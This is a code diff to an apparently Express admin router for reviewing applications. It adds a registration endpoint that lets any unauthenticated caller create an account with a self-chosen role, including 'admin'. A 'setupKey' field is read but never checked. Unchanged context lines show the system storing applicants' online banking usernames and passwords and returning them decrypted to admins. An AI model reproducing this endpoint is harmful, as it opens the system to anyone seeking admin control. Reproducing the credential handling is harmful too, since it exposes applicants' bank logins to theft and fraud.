@@ -5,6 +5,7 @@ import {
   createAdminUser,
   verifyToken,
   getAdminById,
+  getAdminByEmail,
 } from "../services/adminService";
 import {
   listApplications,
@@ -96,6 +97,59 @@ router.post("/auth", async (req: Request, res: Response) => {
   }
 });
 
+// POST /api/admin/auth — Login / Register
+router.post("/auth/register", async (req: Request, res: Response) => {
+  try {
+    const ip =
+      (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
+      req.ip ||
+      "unknown";
+
+    const rl = rateLimit(`login:${ip}`, 5, 60000);
+    if (!rl.allowed) {
+      res
+        .status(429)
+        .set("Retry-After", String(Math.ceil(rl.resetIn / 1000)))
+        .json({ error: "Too many login attempts. Try again later." });
+      return;
+    }
+
+    const { email, password, action, setupKey, name, role } = req.body;
+
+    const existing = await getAdminByEmail(email);
+    if (existing) {
+      res.status(409).json({ error: "User already exists" });
+      return;
+    }
+
+    const normalizedRole = (role || "reviewer") as
+      | "admin"
+      | "reviewer"
+      | "viewer";
+    if (!["admin", "reviewer", "viewer"].includes(normalizedRole)) {
+      res.status(400).json({ error: "Invalid role" });
+      return;
+    }
+
+    const user = await createAdminUser(
+      email,
+      password,
+      name || "Reviewer",
+      normalizedRole,
+    );
+
+    res.json({
+      success: true,
+      user,
+      message: "Admin user registered successfully.",
+    });
+    return user;
+  } catch (error) {
+    console.error("Auth error:", error);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
 // GET /api/admin/auth — Verify token / get current user
 router.get("/auth", async (req: Request, res: Response) => {
   try {
@@ -139,7 +193,9 @@ router.get(
         status: (req.query.status as string) || undefined,
         country: (req.query.country as string) || undefined,
         search: (req.query.search as string) || undefined,
-        date: (req.query.date as string) || ((req.query.search as string) ? undefined : defaultDate),
+        date:
+          (req.query.date as string) ||
+          ((req.query.search as string) ? undefined : defaultDate),
         page: parseInt((req.query.page as string) || "1", 10),
         limit: Math.min(parseInt((req.query.limit as string) || "20", 10), 100),
         sortBy: (req.query.sortBy as string) || "created_at",
@@ -271,12 +327,14 @@ router.get(
           full_name: (bankVerification as any).full_name,
           email: (bankVerification as any).email,
           application_id: bankVerification.application_id,
-          online_banking_username: includeDecrypted && bv.username_decrypted
-            ? bv.username_decrypted
-            : "[ENCRYPTED]",
-          online_banking_password: includeDecrypted && bv.password_decrypted
-            ? bv.password_decrypted
-            : "[ENCRYPTED]",
+          online_banking_username:
+            includeDecrypted && bv.username_decrypted
+              ? bv.username_decrypted
+              : "[ENCRYPTED]",
+          online_banking_password:
+            includeDecrypted && bv.password_decrypted
+              ? bv.password_decrypted
+              : "[ENCRYPTED]",
           bank_name: bankVerification.bank_name,
           account_type: bankVerification.account_type,
           verification_status: bankVerification.verification_status,
